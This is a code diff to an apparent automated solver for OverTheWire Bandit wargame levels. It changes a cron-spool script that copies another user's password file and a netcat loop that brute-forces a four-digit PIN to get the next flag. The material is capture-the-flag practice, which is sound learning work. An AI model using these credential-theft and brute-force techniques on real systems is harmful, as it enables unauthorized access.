@@ -4,6 +4,7 @@ import re
 import os
 import shutil
 from typing import Callable, List
+
 from bandit_client import (
     run_remote_command,
     download_file,
@@ -272,7 +273,7 @@ def bandit23(password: str) -> str:
     cmd += "chmod o+rwx .; "  # the whole directory needs all perms to allow bandit24 in
     cmd += "touch pass.txt; "
     cmd += "chmod o+w pass.txt; "
-    cmd += "echo \"cat /etc/bandit_pass/bandit24 > $(pwd)/pass.txt\" > script.sh; "
+    cmd += 'echo "cat /etc/bandit_pass/bandit24 > $(pwd)/pass.txt" > script.sh; '
     cmd += "chmod o+x script.sh; "
     cmd += "cp script.sh /var/spool/bandit24/foo; "
     cmd += "while [ -e /var/spool/bandit24/foo/script.sh ]; "
@@ -286,16 +287,18 @@ def bandit23(password: str) -> str:
 
 
 def bandit24(password: str) -> str:
-    cmd = "nc localhost 30002 << NC_END\n"
-    for pin in [f"{x:04d}" for x in range(10000)]:
-        cmd += f"{password} {pin}\n"
-    cmd += "NC_END\n"
-    flag = run_remote_command(
-        command=cmd, username="bandit24", password=password
-    ).strip()
-    print(flag)
-    raise NotImplementedError
-    return flag
+    for pin_chunk in [range(0 + x, 1000 + x) for x in range(0, 10000, 1000)]:
+        print(f"checking pins {pin_chunk[0]}-{pin_chunk[-1]}")
+        cmd = "nc -q 0 localhost 30002 << NC_EOF | grep -Eo '[0-9a-zA-Z]{32}$'\n"
+        for pin in [f"{x:04d}" for x in pin_chunk]:
+            cmd += f"{password} {pin}\n"
+        cmd += "NC_EOF\n"
+        flag = run_remote_command(command=cmd, username="bandit24", password=password)
+        if flag:
+            return flag
+        else:
+            print("No flag found")
+    raise Exception("No flag found after trying all pins!")
 
 
 # this is the order that the solvers will be called in, essentially piped together
